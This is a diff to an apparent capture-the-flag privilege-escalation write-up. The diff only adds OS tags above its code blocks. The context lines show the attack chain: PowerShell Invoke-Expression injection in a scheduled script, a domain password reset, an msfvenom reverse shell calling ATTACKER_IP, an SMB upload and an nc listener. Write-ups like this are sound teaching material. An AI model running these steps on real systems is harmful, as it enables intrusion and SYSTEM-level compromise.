@@ -17,6 +17,7 @@ are vulnerable to code injection via semicolons or any PowerShell statement term
 
 Pattern in `checkservers.ps1`:
 
+<!-- cmd: windows -->
 ```powershell
 $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
 Invoke-Expression $p
@@ -36,6 +37,7 @@ of the Test-Connection call and executes the payload in the same context (SYSTEM
 
 ### 1. Identify the scheduled script and its input file
 
+<!-- cmd: windows -->
 ```powershell
 # On the target — check C:\scripts\
 dir C:\scripts\
@@ -45,6 +47,7 @@ type C:\scripts\checkservers.ps1
 
 ### 2. Check script execution frequency
 
+<!-- cmd: linux -->
 ```bash
 # Log timestamp confirms it runs automatically
 dir C:\scripts\log.txt
@@ -54,18 +57,21 @@ dir C:\scripts\log.txt
 
 As a member of **Account Operators**, reset the file owner's (brittanycr) password:
 
+<!-- cmd: windows -->
 ```powershell
 net user brittanycr Password123! /domain
 ```
 
 Verify SMB access (WinRM not required):
 
+<!-- cmd: linux -->
 ```bash
 netexec smb $TARGET -u brittanycr -p 'Password123!'
 ```
 
 ### 4. Generate a reverse shell payload
 
+<!-- cmd: linux -->
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp \
   LHOST=ATTACKER_IP LPORT=1337 \
@@ -74,6 +80,7 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 
 ### 5. Upload the payload and the malicious hosts.txt
 
+<!-- cmd: linux -->
 ```bash
 # Upload the reverse shell binary
 smbclient //$TARGET/Users \
@@ -91,6 +98,7 @@ smbclient //$TARGET/Users \
 
 ### 6. Catch the shell
 
+<!-- cmd: linux -->
 ```bash
 rlwrap nc -lvnp 1337
 ```
